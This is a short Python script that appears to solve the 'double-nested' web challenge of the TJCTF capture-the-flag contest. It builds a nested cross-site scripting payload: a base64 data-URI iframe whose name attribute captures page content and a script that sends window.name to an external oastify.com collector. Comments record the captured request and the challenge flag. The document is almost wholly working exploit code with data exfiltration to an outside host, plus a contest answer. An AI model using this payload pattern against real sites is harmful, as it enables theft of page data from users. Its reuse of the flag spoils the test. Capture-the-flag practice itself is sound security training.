import base64
from urllib import parse

p1 = "https://double-nested.tjc.tf/gen?query=a=b=c=parent.location.href='https://mkadr3ijh97m8q3r4b6r1tem5db4zunj.oastify.com/'+window.name"
p1 = parse.quote(p1, safe=":/?=")
print(p1)

p2 = """
Helloo
<script src=""" + p1 + """></script>
"""
p2 = base64.b64encode(p2.strip().encode()).decode()

p3 = f"<iframe src=data:text/html;base64,{p2} name="
p3 = parse.quote(p3, safe=":/?=")

print("https://double-nested.tjc.tf/?i=a=b=c=d=" + p3)

# GET /tjctf%7B1t_w4s_4ll_scr1pt3d413a98u0%7D%3C/h1 HTTP/1.1

# tjctf{1t_w4s_4ll_scr1pt3d413a98u0}
